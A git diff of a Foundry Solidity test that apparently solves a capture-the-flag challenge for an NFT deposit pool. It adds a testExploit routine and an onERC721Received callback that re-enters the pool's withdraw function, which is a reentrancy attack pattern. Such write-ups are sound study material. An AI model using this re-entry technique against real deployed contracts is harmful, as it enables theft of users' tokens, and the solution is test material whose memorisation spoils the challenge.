@@ -7,10 +7,12 @@ import {Pool, PoolBase} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
 import {WarRoomNFT} from "src/ETHTaipeiWarRoomNFT/NFT.sol";
 
 contract PoolTest is Test {
-    Pool public pool;
     WarRoomNFT public nft;
+    Pool public pool;
+    uint256 public tokenId;
+    address public challenger;
     PoolBase public base;
-    uint256 times = 0;
+    uint256 cnt;
 
     function setUp() public {
         uint256 startTime = block.timestamp + 60;
@@ -18,7 +20,31 @@ contract PoolTest is Test {
         uint256 fullScore = 100;
         base = new PoolBase(startTime, endTime, fullScore);
         base.setup();
+
+        nft = base.nft();
+        pool = base.pool();
+        tokenId = base.tokenId();
+        challenger = base.challenger();
+        cnt = 0;
     }
 
-    function testExploit() public {}
+    function testExploit() public {
+        vm.startPrank(challenger);
+        nft.approve(address(pool), tokenId);
+        pool.deposit(tokenId);
+        pool.withdraw(tokenId);
+        vm.stopPrank();
+
+        base.solve();
+        assertTrue(base.isSolved());
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
+        if (cnt < 2) {
+            cnt++;
+            nft.safeTransferFrom(address(this), address(pool), tokenId);
+            pool.withdraw(tokenId);
+        }
+        return this.onERC721Received.selector;
+    }
 }
